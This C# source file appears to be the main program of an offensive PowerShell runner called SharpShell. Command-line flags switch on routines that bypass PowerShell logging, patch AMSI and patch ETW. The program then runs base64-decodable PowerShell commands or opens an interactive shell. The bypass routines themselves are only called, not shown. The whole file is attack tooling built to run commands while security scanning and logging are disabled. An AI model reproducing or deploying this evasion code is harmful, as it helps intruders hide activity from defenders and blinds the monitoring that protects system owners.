using System;
using SharpShell;
using System.Text;

class Program
{
    static void Main(string[] args)
    {
        string command = null;
        bool isLFlagPresent = false;
        bool isAFlagPresent = false;
        bool isEFlagPresent = false;
        bool isInteractiveMode = false;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-c":
                    if (i + 1 < args.Length)
                    {
                        command = args[i + 1]; // Command
                    }
                    break;
                case "-l":
                    isLFlagPresent = true; // For bypass PowerShell logging
                    break;
                case "-a":
                    isAFlagPresent = true; // For bypass AMSI
                    break;
                case "-e":
                    isEFlagPresent = true; // For bypass ETW
                    break;
                case "-i":
                    isInteractiveMode = true; // Enable interactive mode
                    break;
            }
        }

        // Bypass PowerShell logging
        if (isLFlagPresent)
        {
            PowershellLogging.BypassLogging();
        }
        // AMSI bypass
        if (isAFlagPresent)
        {
            // AMSI bypass.
            Patches.PatchAMSI();
        }
        // ETW bypass
        if (isEFlagPresent)
        {
            // ETW bypass.
            Patches.PatchETW();
        }

        // Check if interactive mode is enabled
        if (isInteractiveMode)
        {
            Console.WriteLine("[+] Entering interactive PowerShell mode. Type 'exit' to quit.");
            Powershell.StartInteractiveShell();
        }
        else if (command != null) // Check if a command was provided
        {
            Console.WriteLine($"[+] Original input: {command}");

            // Check if the command is Base64-encoded
            if (Powershell.IsBase64String(command))
            {
                // Decode the Base64-encoded command
                byte[] data = Convert.FromBase64String(command);
                command = Encoding.UTF8.GetString(data);
                Console.WriteLine($"[+] Decoded command: {command}");
            }

            // Execute the command using PowerShell
            Console.WriteLine("[+] Output:\n");
            Powershell.ExecutePowerShellCommand(command);
        }
        else
        {
            Console.WriteLine("[-] No command found after -c.");
        }
    }
}
